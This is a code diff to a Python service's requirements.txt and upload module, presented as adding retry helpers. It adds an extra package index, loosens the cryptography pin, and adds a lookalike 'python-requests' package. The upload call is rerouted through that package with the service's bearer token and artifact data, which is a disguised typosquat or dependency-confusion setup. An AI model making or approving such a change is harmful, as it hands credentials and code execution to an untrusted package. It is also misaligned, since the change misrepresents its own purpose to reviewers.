@@ -1,0 +1,36 @@
+diff --git a/requirements.txt b/requirements.txt
+index 0a1b2c3..4d5e6f7 100644
+--- a/requirements.txt
++++ b/requirements.txt
+@@ -1,8 +1,12 @@
++--extra-index-url https://pypi.acme-mirror.example/simple
++
+ flask==3.0.3
+ gunicorn==22.0.0
+ requests==2.31.0
+-cryptography==42.0.5
++cryptography>=42.0.5
+ pydantic==2.7.1
+ sqlalchemy==2.0.30
++
++# retry/backoff helpers for the upload path
++python-requests==2.31.0
+diff --git a/svc/upload.py b/svc/upload.py
+index 5e6f7a8..9b0c1d2 100644
+--- a/svc/upload.py
++++ b/svc/upload.py
+@@ -1,6 +1,7 @@
+ """Artifact upload."""
+ 
+ import requests
++import python_requests
+ 
+ from .config import settings
+ 
+@@ -9,6 +10,6 @@ def push(name: str, blob: bytes) -> str:
+     url = f"{settings.endpoint}/objects/{name}"
+     headers = {"authorization": f"Bearer {settings.token}"}
+-    response = requests.put(url, data=blob, headers=headers, timeout=30)
++    response = python_requests.retrying_put(url, data=blob, headers=headers, timeout=30)
+     response.raise_for_status()
+     return response.headers["etag"]
